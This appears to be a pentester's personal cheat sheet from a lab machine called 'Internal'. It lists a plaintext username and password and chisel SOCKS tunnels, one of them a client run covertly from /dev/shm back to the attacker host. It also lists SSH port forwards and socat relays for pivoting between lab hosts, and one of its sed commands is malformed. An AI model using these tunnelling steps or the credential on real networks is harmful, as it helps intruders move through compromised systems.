# Internal CMD-by-CMDs

```bash
sed -i 's///g' *-CMD-by-CMDs.md

ls -1 Screenshots | awk '{print"![]("$1")"}'
```

```

aubreanna : bubb13guM!@#123
```

```bash

# Chisel Servers and Clients for Dynamic port forward
chisel server --host 10.11.3.193 -p 10000 -v --socks5 --auth operationiditiot:theproxybeamsarealight
nohup /dev/shm/chisel client 10.11.3.193:10000 --fingerprint 'RUKtTeLKm65YtQ7I5bhDKUb4WB8S5yY69/fQX7Eb5aw=' 10001:socks &  




```


```
ssh -N -L 0.0.0.0:4141:$interfaceToAccessBox2:445 $box2User@$box2_address
socat TCP-LISTEN:6969,fork,reuseaddr,bind=127.0.0.1 TCP:remote_ip:remote_port
```

```
ssh -N -L 10.11.3.193:9000 10.10.52.103:2222 aubreanna@10.10.52.103

socat TCP-LISTEN:6969,fork,reuseaddr,bind=127.0.0.1 TCP:10.10.52.103:2222
```


Original
```
ssh -N -D 127.0.0.1:$port $user@$SSH_server_address
```
Modified
```
ssh -N -D 127.0.0.1:9000 aubreanna@10.10.52.103
```